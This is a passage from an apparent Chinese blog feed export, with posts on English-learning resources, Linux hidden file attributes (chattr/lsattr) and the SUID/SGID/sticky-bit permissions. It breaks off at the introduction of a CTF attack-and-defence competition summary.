&#xFF08;&#x80CC;&#x5355;&#x8BCD;&#xFF0C;&#x73B0;&#x7528;</p><p>&#x5206;&#x4EAB;&#x81EA;&#x5236;&#x7684;&#x82F1;&#x8BED;&#x8BCD;&#x6C47;&#x8868;&#xFF1A;<br>&#x4E54;&#x5E03;&#x65AF;2005&#x5E74;&#x5728;&#x65AF;&#x5766;&#x798F;&#x5927;&#x5B66;&#x7684;&#x6F14;&#x8BB2;&#xFF08;224&#x8BCD;&#xFF09; <a href="http://www.shanbay.com/wordbook/5119/" target="_blank" rel="noopener">&#x6247;&#x8D1D;&#x5355;&#x8BCD;&#x4E66;</a> / <a href="http://www.tudou.com/programs/view/Cerx7xz2DzA/" target="_blank" rel="noopener">&#x6F14;&#x8BB2;&#x89C6;&#x9891;(&#x4E2D;&#x82F1;&#x5B57;&#x5E55;)</a><br>TED&#xFF1A;Ernesto Sirolli &#x2013; &#x60F3;&#x8981;&#x5E2E;&#x52A9;&#x522B;&#x4EBA;&#xFF1F;&#x95ED;&#x5634;&#xFF0C;&#x542C;&#x4EBA;&#x5BB6;&#x8BF4;&#xFF01;&#xFF08;546&#x8BCD;&#xFF09;<a href="http://www.shanbay.com/wordbook/6874/" target="_blank" rel="noopener">&#x6247;&#x8D1D;&#x5355;&#x8BCD;&#x4E66;</a> / <a href="http://www.ted.com/talks/ernesto_sirolli_want_to_help_someone_shut_up_and_listen.html" target="_blank" rel="noopener">&#x6F14;&#x8BB2;&#x89C6;&#x9891;</a><br>&#x7535;&#x5F71;&#x300A;Hotel Transylvania&#x300B;(1542&#x8BCD;) <a href="http://pan.baidu.com/share/link?shareid=264482&amp;uk=304925281" target="_blank" rel="noopener">&#x5B8C;&#x6574;&#x8BCD;&#x4E32;&#x4E0B;&#x8F7D;</a> / <a href="http://www.shanbay.com/wordbook/6088/" target="_blank" rel="noopener">&#x6247;&#x8D1D;&#x8BCD;&#x4E32;</a> / <a href="http://open.sina.com.cn/course/id_322/lesson_4399/" target="_blank" rel="noopener">&#x7535;&#x5F71;&#x4ECB;&#x7ECD;</a><br>&#x8036;&#x9C81;&#x516C;&#x5F00;&#x8BFE;&#xFF1A;&#x7F8E;&#x56FD;&#x73B0;&#x4EE3;&#x4E3B;&#x4E49;&#x6587;&#x5B66;&#x9009;&#x8BFB; &#x7B2C;&#x4E09;&#x8BFE;(1257&#x8BCD;) <a href="http://pan.baidu.com/share/link?shareid=264482&amp;uk=304925281" target="_blank" rel="noopener">&#x5B8C;&#x6574;&#x8BCD;&#x4E32;&#x4E0B;&#x8F7D;</a> / <a href="http://open.sina.com.cn/course/id_322/lesson_4399/" target="_blank" rel="noopener">&#x8BFE;&#x7A0B;&#x89C6;&#x9891;</a></p><p><strong>&#x8BED;&#x6CD5;</strong><br>&#x4E0A;&#x5B66;&#x65F6;&#x7684;&#x82F1;&#x8BED;&#x8001;&#x5E08;&#x4EEC;&#x7684;&#x558B;&#x558B;&#x4E0D;&#x4F11;&#x8F9B;&#x52E4;&#x4F20;&#x6388;<br>&#x8BED;&#x6CD5;&#x4E66;</p><p><strong>&#x9605;&#x8BFB;</strong><br><a href="http://book.douban.com/subject/1370897/" target="_blank" rel="noopener">The Little Prince</a> &#xFF08;&#x597D;&#x8BFB;&#x3001;&#x6709;&#x8DA3;&#x3001;&#x4E66;&#x4E0D;&#x539A;<br>&#x6211;&#x7684;&#x9605;&#x8BFB;&#x65B9;&#x6CD5;&#x662F;&#xFF0C;&#x4E00;&#x6B21;&#x8BFB;&#x4E00;&#x7AE0;&#x8282;&#xFF0C;&#x4E0D;&#x61C2;&#x7684;&#x5355;&#x8BCD;&#x67E5;&#x5B57;&#x5178;&#x5E76;&#x6807;&#x8BB0;&#xFF08;Kindle&#x4E0A;&#x6BD4;&#x8F83;&#x65B9;&#x4FBF;&#xFF09;&#xFF1B;&#x8BFB;&#x5B8C;&#x672C;&#x7AE0;&#x8282;&#x540E;&#x56DE;&#x987E;&#x6807;&#x8BB0;&#x7684;&#x5355;&#x8BCD;&#xFF1B;&#x7B2C;&#x4E8C;&#x5929;&#x5148;&#x56DE;&#x987E;&#x6628;&#x65E5;&#x6807;&#x8BB0;&#x5355;&#x8BCD;&#xFF0C;&#x518D;&#x590D;&#x770B;&#x6628;&#x65E5;&#x7AE0;&#x8282;&#xFF1B;&#x7136;&#x540E;&#x7EE7;&#x7EED;&#x9605;&#x8BFB;&#x4E0B;&#x4E00;&#x7AE0;&#x8282;&#xFF1B;&#x5982;&#x6B64;&#x65B9;&#x5F0F;&#x6301;&#x7EED;&#x8BFB;&#x5B8C;&#x3002;</p><p><strong>&#x89C6;&#x542C;</strong><br>TED <a href="http://www.ted.com/talks" target="_blank" rel="noopener">http://www.ted.com/talks</a> &#xFF08;&#x4E30;&#x5BCC;&#x4F18;&#x8D28;&#x7684;&#x6F14;&#x8BB2;&#x89C6;&#x9891;&#xFF0C;&#x6709;&#x591A;&#x56FD;&#x8BED;&#x8A00;&#x5B57;&#x5E55;</p><p>&#x53F2;&#x8482;&#x592B;&#xB7;&#x4E54;&#x5E03;&#x65AF;2005&#x5E74;6&#x6708;&#x5728;&#x65AF;&#x5766;&#x798F;&#x5927;&#x5B66;&#x6BD5;&#x4E1A;&#x5178;&#x793C;&#x4E0A;&#x7684;&#x6F14;&#x8BB2;<br><a href="http://pan.baidu.com/share/link?shareid=203002&amp;uk=304925281" target="_blank" rel="noopener">&#x8BCD;&#x4E32;&#x4E0B;&#x8F7D;</a> / <a href="http://pan.baidu.com/share/link?shareid=203000&amp;uk=304925281" target="_blank" rel="noopener">&#x6F14;&#x8BB2;&#x6587;&#x672C;(&#x82F1;&#x6587;+&#x4E2D;&#x6587;)&#x4E0B;&#x8F7D;</a> / <a href="http://www.tudou.com/programs/view/Cerx7xz2DzA/" target="_blank" rel="noopener">&#x6F14;&#x8BB2;&#x89C6;&#x9891;(&#x4E2D;&#x82F1;&#x5B57;&#x5E55;)</a> / <a href="http://pan.baidu.com/share/link?shareid=202986&amp;uk=304925281" target="_blank" rel="noopener">&#x6F14;&#x8BB2;&#x97F3;&#x9891;</a></p><p>Joe Wang&#x2019;s Talk Show on the Late Show<br><a href="http://pan.baidu.com/share/link?shareid=210010&amp;uk=304925281" target="_blank" rel="noopener">&#x8BCD;&#x4E32;&#x4E0B;&#x8F7D;</a> / <a href="http://www.tudou.com/listplay/AHMzWWhLE5M/Vg3YjDjeE5E.html" target="_blank" rel="noopener">&#x8131;&#x53E3;&#x79C0;&#x89C6;&#x9891;</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://dramatea.github.io/077%20%E6%88%91%E5%AD%A6%E7%BB%83%E8%8B%B1%E8%AF%AD%E6%89%80%E4%BD%BF%E7%94%A8%E7%9A%84%E6%96%B9%E6%B3%95%E3%80%81%E5%B7%A5%E5%85%B7%E4%B8%8E%E8%B5%84%E6%96%99.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;原文：dramatea&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;试用过的方法（按进展的时间顺序）&lt;/strong&gt;&lt;br&gt;初中高中大学的英语课堂与考试&lt;br&gt;【不得不承认我那可怜的语法知识和大多数单词都是在这个阶段掌握的&lt;br&gt;
    
    </summary>
    
    
      <category term="英语" scheme="https://marnm.github.io/tags/%E8%8B%B1%E8%AF%AD/"/>
    
      <category term="学习" scheme="https://marnm.github.io/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>Linux文件的隐藏属性</title>
    <link href="https://marnm.github.io//posts/cc999d74/"/>
    <id>https://marnm.github.io//posts/cc999d74/</id>
    <published>2018-08-20T08:46:44.000Z</published>
    <updated>2020-04-09T11:50:09.017Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</h2><p>&#xA0;&#xA0;Linux&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x6587;&#x4EF6;&#x9664;&#x4E86;&#x5177;&#x5907;&#x4E00;&#x822C;&#x6743;&#x9650;&#x548C;&#x7279;&#x6B8A;&#x6743;&#x9650;&#x4E4B;&#x5916;&#xFF0C;&#x8FD8;&#x6709;&#x4E00;&#x79CD;&#x9690;&#x85CF;&#x6743;&#x9650;&#xFF0C;&#x5373;&#x88AB;&#x9690;&#x85CF;&#x8D77;&#x6765;&#x7684;&#x6743;&#x9650;&#xFF0C;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#x4E0D;&#x80FD;&#x76F4;&#x63A5;&#x88AB;&#x7528;&#x6237;&#x53D1;&#x89C9;&#x3002;&#x6709;&#x7528;&#x6237;&#x66FE;&#x7ECF;&#x5728;&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x548C;RHCE&#x8003;&#x8BD5;&#x9898;&#x76EE;&#x4E2D;&#x78B0;&#x5230;&#x8FC7;&#x660E;&#x660E;&#x6743;&#x9650;&#x5145;&#x8DB3;&#x4F46;&#x5374;&#x65E0;&#x6CD5;&#x5220;&#x9664;&#x67D0;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x6216;&#x8005;&#x4EC5;&#x80FD;&#x5728;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x4E2D;&#x8FFD;&#x52A0;&#x5185;&#x5BB9;&#x800C;&#x4E0D;&#x80FD;&#x4FEE;&#x6539;&#x6216;&#x5220;&#x9664;&#x5185;&#x5BB9;&#xFF0C;&#x8FD9;&#x5728;&#x4E00;&#x5B9A;&#x7A0B;&#x5EA6;&#x4E0A;&#x963B;&#x6B62;&#x4E86;&#x9ED1;&#x5BA2;&#x7BE1;&#x6539;&#x7CFB;&#x7EDF;&#x65E5;&#x5FD7;&#x7684;&#x56FE;&#x8C0B;&#xFF0C;&#x56E0;&#x6B64;&#x8FD9;&#x79CD;&#x201C;&#x5947;&#x602A;&#x201D;&#x7684;&#x6587;&#x4EF6;&#x4E5F;&#x4FDD;&#x969C;&#x4E86;Linux&#x7CFB;&#x7EDF;&#x7684;&#x5B89;&#x5168;&#x6027;&#x3002;<br><a id="more"></a></p><h2 id="chattr-&#x547D;&#x4EE4;"><a href="#chattr-&#x547D;&#x4EE4;" class="headerlink" title="chattr &#x547D;&#x4EE4;"></a>chattr &#x547D;&#x4EE4;</h2><p>&#xA0;&#xA0;&#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x8BBE;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x9690;&#x85CF;&#x6743;&#x9650;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;chattr [&#x53C2;&#x6570;] &#x6587;&#x4EF6;&#x201D;&#x3002;&#x5982;&#x679C;&#x60F3;&#x8981;&#x628A;&#x67D0;&#x4E2A;&#x9690;&#x85CF;&#x529F;&#x80FD;&#x6DFB;&#x52A0;&#x5230;&#x6587;&#x4EF6;&#x4E0A;&#xFF0C;&#x5219;&#x9700;&#x8981;&#x5728;&#x547D;&#x4EE4;&#x540E;&#x9762;&#x8FFD;&#x52A0;&#x201D;+&#x53C2;&#x6570;&#x201D;,&#x5982;&#x679C;&#x60F3;&#x8981;&#x628A;&#x67D0;&#x4E2A;&#x9690;&#x85CF;&#x529F;&#x80FD;&#x79FB;&#x51FA;&#x6587;&#x4EF6;&#xFF0C;&#x5219;&#x9700;&#x8981;&#x8FFD;&#x52A0;&#x201D;-&#x53C2;&#x6570;&#x201D;&#x3002;</p><table><thead><tr><th>&#x53C2;&#x6570;</th><th>&#x4F5C;&#x7528;</th><th>&#x53C2;&#x6570;</th><th style="text-align:center">&#x4F5C;&#x7528;</th></tr></thead><tbody><tr><td>i</td><td>&#x65E0;&#x6CD5;&#x5BF9;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x4FEE;&#x6539;&#xFF1B;&#x82E5;&#x5BF9;&#x76EE;&#x5F55;&#x8BBE;&#x7F6E;&#x4E86;&#x8BE5;&#x53C2;&#x6570;&#xFF0C;&#x5219;&#x4EC5;&#x80FD;&#x5C31;&#x4FEE;&#x6539;&#x5176;&#x4E2D;&#x7684;&#x5B50;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#xFF0C;&#x800C;&#x4E0D;&#x80FD;&#x65B0;&#x5EFA;&#x6216;&#x5220;&#x9664;&#x6587;&#x4EF6;</td><td>a</td><td style="text-align:center">&#x4EC5;&#x5141;&#x8BB8;&#x8865;&#x5145;&#xFF08;&#x8FFD;&#x52A0;&#xFF09;&#x5185;&#x5BB9;&#xFF0C;&#x65E0;&#x6CD5;&#x8986;&#x76D6;/&#x5220;&#x9664;&#x5185;&#x5BB9;(Append Only)</td></tr><tr><td>S</td><td>&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x5728;&#x53D8;&#x66F4;&#x540E;&#x7ACB;&#x5373;&#x540C;&#x6B65;&#x5230;&#x786C;&#x76D8;(sync)</td><td>s</td><td style="text-align:center">&#x5F7B;&#x5E95;&#x4ECE;&#x786C;&#x76D8;&#x4E2D;&#x5220;&#x9664;&#xFF0C;&#x4E0D;&#x53EF;&#x6062;&#x590D;&#xFF08;&#x7528;0&#x586B;&#x5145;&#x539F;&#x6587;&#x4EF6;&#x6240;&#x5728;&#x786C;&#x76D8;&#x533A;&#x57DF;</td></tr><tr><td>A</td><td>&#x4E0D;&#x518D;&#x4FEE;&#x6539;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x6216;&#x76EE;&#x5F55;&#x7684;&#x6700;&#x540E;&#x8BBF;&#x95EE;&#x65F6;&#x95F4;(atime)</td><td>b</td><td style="text-align:center">&#x4E0D;&#x518D;&#x4FEE;&#x6539;&#x6587;&#x4EF6;&#x6216;&#x76EE;&#x5F55;&#x7684;&#x5B58;&#x53D6;&#x65F6;&#x95F4;</td></tr><tr><td>D</td><td>&#x68C0;&#x67E5;&#x538B;&#x7F29;&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x9519;&#x8BEF;</td><td>d</td><td style="text-align:center">&#x4F7F;&#x7528;dump&#x547D;&#x4EE4;&#x5907;&#x4EFD;&#x662F;&#x5FFD;&#x7565;&#x672C;&#x6587;&#x4EF6;/&#x76EE;&#x5F55;</td></tr><tr><td>c</td><td>&#x9ED8;&#x8BA4;&#x5C06;&#x6587;&#x4EF6;&#x6216;&#x76EE;&#x5F55;&#x8FDB;&#x884C;&#x538B;&#x7F29;</td><td>u</td><td style="text-align:center">&#x5F53;&#x5220;&#x9664;&#x8BE5;&#x6587;&#x4EF6;&#x540E;&#x4F9D;&#x7136;&#x4FDD;&#x7559;&#x5176;&#x5728;&#x786C;&#x76D8;&#x4E2D;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x65B9;&#x4FBF;&#x65E5;&#x540E;&#x6062;&#x590D;</td></tr><tr><td>t</td><td>&#x8BA9;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x652F;&#x6301;&#x5C3E;&#x90E8;&#x5408;&#x5E76;(tail-merging)</td><td>x</td><td style="text-align:center">&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;&#x538B;&#x7F29;&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x5185;&#x5BB9;</td></tr></tbody></table><h2 id="lsattr-&#x547D;&#x4EE4;"><a href="#lsattr-&#x547D;&#x4EE4;" class="headerlink" title="lsattr &#x547D;&#x4EE4;"></a>lsattr &#x547D;&#x4EE4;</h2><p>&#xA0;&#xA0;<code>lsattr</code>&#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x663E;&#x793A;&#x6587;&#x4EF6;&#x7684;&#x9690;&#x85CF;&#x6743;&#x9650;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;<code>lsattr [&#x53C2;&#x6570;] &#x6587;&#x4EF6;</code>&#x3002;&#x5728;Linux&#x7CFB;&#x7EDF;&#x4E2D;&#x4E2A;&#xFF0C;&#x6587;&#x4EF6;&#x7684;&#x9690;&#x85CF;&#x6743;&#x9650;&#x5FC5;&#x987B;&#x4F7F;&#x7528;<code>lsattr</code>&#x547D;&#x4EE4;&#x67E5;&#x770B;&#xFF0C;&#x5E73;&#x65F6;&#x4F7F;&#x7528;<code>ls</code>&#x4E4B;&#x7C7B;&#x7684;&#x547D;&#x4EE4;&#x5219;&#x770B;&#x4E0D;&#x51FA;&#x6765;&#x3002;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;Linux系统中的文件除了具备一般权限和特殊权限之外，还有一种隐藏权限，即被隐藏起来的权限，默认情况下不能直接被用户发觉。有用户曾经在生产环境和RHCE考试题目中碰到过明明权限充足但却无法删除某个文件的情况，或者仅能在日志文件中追加内容而不能修改或删除内容，这在一定程度上阻止了黑客篡改系统日志的图谋，因此这种“奇怪”的文件也保障了Linux系统的安全性。&lt;br&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://marnm.github.io/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://marnm.github.io/tags/Linux/"/>
    
      <category term="chattr命令" scheme="https://marnm.github.io/tags/chattr%E5%91%BD%E4%BB%A4/"/>
    
      <category term="lsattr命令" scheme="https://marnm.github.io/tags/lsattr%E5%91%BD%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>Linux文件的特殊权限</title>
    <link href="https://marnm.github.io//posts/a9bb0c1a/"/>
    <id>https://marnm.github.io//posts/a9bb0c1a/</id>
    <published>2018-08-19T15:05:06.000Z</published>
    <updated>2020-04-09T11:50:09.020Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h2><p>SUID&#x662F;&#x4E00;&#x79CD;&#x5BF9;&#x4E8C;&#x8FDB;&#x5236;&#x7A0B;&#x5E8F;&#x8FDB;&#x884C;&#x8BBE;&#x7F6E;&#x7684;&#x7279;&#x6B8A;&#x6743;&#x9650;&#xFF0C;&#x53EF;&#x4EE5;&#x8BA9;&#x4E8C;&#x8FDB;&#x5236;&#x7A0B;&#x5E8F;&#x7684;&#x6267;&#x884C;&#x8005;&#x4E34;&#x65F6;&#x62E5;&#x6709;&#x5C5E;&#x4E3B;&#x7684;&#x6743;&#x9650;&#xFF08;&#x4EC5;&#x5BF9;&#x62E5;&#x6709;&#x6267;&#x884C;&#x6743;&#x9650;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x7A0B;&#x5E8F;&#x6709;&#x6548;&#xFF09;&#x3002;&#x5C31;&#x60F3;&#x624B;&#x6301;&#x5C1A;&#x65B9;&#x5B9D;&#x5251;&#x7684;&#x94A6;&#x5DEE;&#x5927;&#x81E3;&#xFF0C;&#x4ED6;&#x624B;&#x6301;&#x7684;&#x5C1A;&#x65B9;&#x5B9D;&#x5251;&#x4EE3;&#x8868;&#x7684;&#x662F;&#x7687;&#x4E0A;&#x7684;&#x6743;&#x5A01;&#xFF0C;&#x56E0;&#x6B64;&#x53EF;&#x4EE5;&#x60E9;&#x6212;&#x8D2A;&#x5B98;&#xFF0C;&#x4F46;&#x5E76;&#x4E0D;&#x610F;&#x5473;&#x8FD9;&#x4ED6;&#x6C38;&#x4E45;&#x6210;&#x4E3A;&#x4E86;&#x7687;&#x4E0A;&#x3002;<br>&#x67E5;&#x770B;passwd&#x547D;&#x4EE4;&#x5C5E;&#x6027;&#x662F;&#x53D1;&#x73B0;&#x6240;&#x6709;&#x8005;&#x7684;&#x6743;&#x9650;&#x6709;<code>rwx</code>&#x53D8;&#x6210;&#x4E86;<code>rws</code>&#xFF0C;&#x5176;&#x4E2D;<strong>x</strong>&#x53D8;&#x6210;<strong>s</strong>&#x5C31;&#x610F;&#x5473;&#x7740;&#x8BE5;&#x6587;&#x4EF6;&#x88AB;&#x8D4B;&#x4E88;&#x4E86;SUID&#x6743;&#x9650;&#x3002;<br>&#x90A3;&#x5982;&#x679C;&#x539F;&#x672C;&#x7684;&#x6743;&#x9650;&#x662F;<code>rw-</code>&#x5462;?&#x5982;&#x679C;&#x539F;&#x5148;&#x7684;&#x6743;&#x9650;&#x4F4D;&#x4E0A;&#x6CA1;&#x6709;<code>x</code>&#x6267;&#x884C;&#x6743;&#x9650;&#xFF0C;&#x90A3;&#x4E48;&#x80CC;&#x8D4B;&#x4E88;&#x7279;&#x6B8A;&#x6743;&#x9650;&#x540E;&#x5C06;&#x53D8;&#x6210;&#x5927;&#x5199;&#x7684;S&#x3002;<br><a id="more"></a></p><h2 id="SGID"><a href="#SGID" class="headerlink" title="SGID"></a>SGID</h2><p>SGID&#x4E3B;&#x8981;&#x5B9E;&#x73B0;&#x5982;&#x4E0B;&#x4E24;&#x79CD;&#x529F;&#x80FD;&#xFF1A;<br>&gt; &#x8BA9;&#x6267;&#x884C;&#x8005;&#x4E34;&#x65F6;&#x62E5;&#x6709;&#x5C5E;&#x7EC4;&#x7684;&#x6743;&#x9650;&#xFF08;&#x5BF9;&#x62E5;&#x6709;&#x6267;&#x884C;&#x6743;&#x9650;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x7A0B;&#x5E8F;&#x8FDB;&#x884C;&#x8BBE;&#x7F6E;&#xFF09;&#xFF1B;<br>&gt; &#x5728;&#x67D0;&#x4E2A;&#x76EE;&#x5F55;&#x4E2D;&#x521B;&#x5EFA;&#x7684;&#x6587;&#x4EF6;&#x81EA;&#x52A8;&#x7EE7;&#x627F;&#x8BE5;&#x76EE;&#x5F55;&#x7684;&#x7528;&#x6237;&#x7EC4;&#xFF08;&#x53EA;&#x53EF;&#x4EE5;&#x5BF9;&#x76EE;&#x5F55;&#x8FDB;&#x884C;&#x8BBE;&#x7F6E;&#xFF09;&#x3002;</p><h2 id="SBIT"><a href="#SBIT" class="headerlink" title="SBIT"></a>SBIT</h2><p>&#x73B0;&#x5728;&#xFF0C;&#x5927;&#x5B66;&#x91CC;&#x7684;&#x5F88;&#x591A;&#x8001;&#x5E08;&#x90FD;&#x8981;&#x6C42;&#x5B66;&#x751F;&#x5C06;&#x4F5C;&#x4E1A;&#x4E0A;&#x4F20;&#x5230;&#x670D;&#x52A1;&#x5668;&#x7684;&#x7279;&#x5B9A;&#x5171;&#x4EAB;&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#x4F46;&#x603B;&#x662F;&#x6709;&#x51E0;&#x4E2A;&#x201C;&#x7834;&#x574F;&#x5206;&#x5B50;&#x201D;&#x559C;&#x6B22;&#x5220;&#x9664;&#x5176;&#x4ED6;&#x540C;&#x5B66;&#x7684;&#x4F5C;&#x4E1A;&#xFF0C;&#x8FD9;&#x65F6;&#x5C31;&#x8981;&#x8BBE;&#x7F6E;SBIT(Sticky Bit)&#x7279;&#x6B8A;&#x6743;&#x9650;&#x4F4D;&#x4E86;(&#x4E5F;&#x53EF;&#x4EE5;&#x79F0;&#x4E4B;&#x4E3A;&#x7279;&#x6B8A;&#x6743;&#x9650;&#x4F4D;&#x4E4B;&#x7C98;&#x6EDE;&#x4F4D;)&#x3002;SBIT&#x7279;&#x6B8A;&#x6743;&#x9650;&#x53EF;&#x786E;&#x4FDD;&#x7528;&#x6237;&#x53EA;&#x80FD;&#x5220;&#x9664;&#x81EA;&#x5DF1;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x800C;&#x4E0D;&#x80FD;&#x5220;&#x9664;&#x5176;&#x4ED6;&#x7528;&#x6237;&#x7684;&#x6587;&#x4EF6;&#x3002;</p><h1 id="&#x5F85;&#x66F4;&#x65B0;&#x3002;&#x3002;&#x3002;"><a href="#&#x5F85;&#x66F4;&#x65B0;&#x3002;&#x3002;&#x3002;" class="headerlink" title="&#x5F85;&#x66F4;&#x65B0;&#x3002;&#x3002;&#x3002;"></a>&#x5F85;&#x66F4;&#x65B0;&#x3002;&#x3002;&#x3002;</h1><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;SUID&quot;&gt;&lt;a href=&quot;#SUID&quot; class=&quot;headerlink&quot; title=&quot;SUID&quot;&gt;&lt;/a&gt;SUID&lt;/h2&gt;&lt;p&gt;SUID是一种对二进制程序进行设置的特殊权限，可以让二进制程序的执行者临时拥有属主的权限（仅对拥有执行权限的二进制程序有效）。就想手持尚方宝剑的钦差大臣，他手持的尚方宝剑代表的是皇上的权威，因此可以惩戒贪官，但并不意味这他永久成为了皇上。&lt;br&gt;查看passwd命令属性是发现所有者的权限有&lt;code&gt;rwx&lt;/code&gt;变成了&lt;code&gt;rws&lt;/code&gt;，其中&lt;strong&gt;x&lt;/strong&gt;变成&lt;strong&gt;s&lt;/strong&gt;就意味着该文件被赋予了SUID权限。&lt;br&gt;那如果原本的权限是&lt;code&gt;rw-&lt;/code&gt;呢?如果原先的权限位上没有&lt;code&gt;x&lt;/code&gt;执行权限，那么背赋予特殊权限后将变成大写的S。&lt;br&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://marnm.github.io/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://marnm.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>CTF线下赛AWD套路小结</title>
    <link href="https://marnm.github.io//posts/28c30eb2/"/>
    <id>https://marnm.github.io//posts/28c30eb2/</id>
    <published>2018-08-13T09:03:28.000Z</published>
    <updated>2022-04-28T06:34:56.338Z</updated>
    
    <content type="html"><![CDATA[<p>CTF&#x7F51;&#x7EDC;&#x5B89;&#x5168;&#x653B;&#x9632;&#x8D5B;&#x5165;&#x95E8;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x5BF9;&#x9ED1;&#x5BA2;&#x653B;&#x9632;&#x611F;&#x5174;&#x8DA3;&#x7684;&#x8BDD;&#x770B;&#x770B;&#x8FD9;&#x7BC7;&#x5165;&#x95E8;&#x3002;<br>&#x65B0;&#x624B;&#x8BE5;&#x77E5;&#x9053;&#x7684;&#x4E00;&#x4E9B;&#x77E5;&#x8BC6;&#x4EE5;&#x53CA;&#x6280;&#x5DE7;&#xFF0C;&#x4E0B;&#x9762;&#x7B80;&#x5355;&#x6574;&#x7406;&#x4E00;&#x4E0B;<br><a id="more"></a></p><blockquote><p>&#x539F;&#x521B;&#xFF1A;tinyfisher<br>&#x8F6C;&#x8F7D;&#xFF1A;<a href="https://xz.aliyun.com/" target="_blank" rel="noopener">&#x5148;&#x77E5;&#x5B89;&#x5168;&#x6280;&#x672F;&#x793E;&#x533A;</a></p></blockquote><p>&#x6700;&#x8FD1;&#x6253;&#x4E86;2&#x573A;CTF&#x7EBF;&#x4E0B;&#x8D5B;&#xFF0C;&#x628A;AWD&#x6A21;&#x5F0F;&#x4E2D;&#x7684;&#x4E00;&#x4E9B;&#x5C0F;&#x5957;&#x8DEF;&#x505A;&#x4E00;&#x4E9B;&#x603B;&#x7ED3;&#xFF0C;&#x672C;&#x4EBA;web&#x72D7;&#xFF0C;&#x4E8C;&#x8FDB;&#x5236;&#x90E8;&#x5206;&#x5C31;&#x4E0D;&#x73ED;&#x95E8;&#x5F04;&#x65A7;&#x4E86;&#x3002;</p><h1 id="&#x4E00;&#x3001;AWD&#x6A21;&#x5F0F;&#x7B80;&#x4ECB;"><a href="#&#x4E00;&#x3001;AWD&#x6A21;&#x5F0F;&#x7B80;&#x4ECB;" class="headerlink" title="&#x4E00;&#x3001;AWD&#x6A21;&#x5F0F;&#x7B80;&#x4ECB;"></a>&#x4E00;&#x3001;AWD&#x6A21;&#x5F0F;&#x7B80;&#x4ECB;</h1><p>AWD: Attack With Defence, 